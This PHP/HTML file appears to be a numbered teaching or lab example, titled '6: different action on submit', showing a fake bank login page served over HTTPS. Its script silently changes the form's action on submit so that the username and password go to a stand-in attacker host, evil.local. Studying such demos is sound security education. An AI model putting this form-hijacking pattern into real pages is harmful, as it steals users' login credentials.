<?php
$is_https = isset($_SERVER['HTTPS']) &&
    ($_SERVER['HTTPS'] == 'on' || $_SERVER['HTTPS'] == 1);

if (!$is_https) {
  http_response_code(400);
  die('login page must be over https');
}

session_start();
?>

<!doctype html>
<html>
<head>
  <title>Bank Login</title>
  <script>
    document.addEventListener('DOMContentLoaded', function() {
      const form = document.querySelector('form');
      form.addEventListener('submit', function() {
        form.setAttribute('action', 'https://evil.local/print_login.php');
      });
    });
  </script>
</head>
<body>

<h1>
  Log into Your Bank&trade;
</h1>

<h2 style="color: red">6: different action on submit</h2>

<form action="https://bank.local/do_login.php" method="POST">
  <fieldset>
    <legend>Login</legend>
    <label>
      Username:
      <input type="text" name="username">
    </label>
    <br>
    <label>
      Password:
      <input type="password" name="password">
    </label>
    <br>
    <input type="submit">
  </fieldset>
</form>

</body>
</html>
